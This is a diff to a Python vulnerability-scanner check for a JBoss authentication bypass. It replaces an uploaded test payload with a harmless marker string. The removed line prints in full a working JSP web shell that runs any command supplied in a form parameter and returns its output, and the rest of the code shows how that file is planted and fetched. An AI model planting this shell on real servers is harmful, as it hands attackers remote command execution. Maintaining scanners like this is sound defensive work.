@@ -32,7 +32,7 @@ def check(host, port, timeout):
         socket.setdefaulttimeout(timeout)
         s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s1.connect((host, int(port)))
-        shell = """<%@ page import="java.util.*,java.io.*"%> <% %> <HTML><BODY> <FORM METHOD="GET" NAME="comments" ACTION=""> <INPUT TYPE="text" NAME="comment"> <INPUT TYPE="submit" VALUE="Send"> </FORM> <pre> <% if (request.getParameter("comment") != null) { out.println("Command: " + request.getParameter("comment") + "<BR>"); Process p = Runtime.getRuntime().exec(request.getParameter("comment")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %> </pre> </BODY></HTML>"""
+        shell = "xunfeng"
         # s1.recv(1024)
         shellcode = ""
         name = random_str(5)
@@ -49,8 +49,8 @@ def check(host, port, timeout):
         url = "http://%s:%d" % (host, int(port))
         webshell_url = "%s/%s/xunfeng.jsp" % (url, name)
         res = urllib2.urlopen(webshell_url, timeout=timeout)
-        if 'comments' in res.read():
-            info = u"Jboss Authentication bypass webshell:%s" % (webshell_url)
+        if 'xunfeng' in res.read():
+            info = u"Jboss Authentication bypass url:%s" % (webshell_url)
             return info
     except Exception, e:
         pass
